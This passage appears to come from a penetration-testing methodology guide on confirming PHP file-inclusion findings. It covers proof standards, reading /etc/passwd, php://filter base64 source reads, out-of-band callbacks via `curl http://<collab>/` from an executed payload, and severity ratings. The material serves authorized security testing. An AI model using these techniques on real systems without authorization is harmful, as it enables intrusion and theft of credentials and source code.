- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**

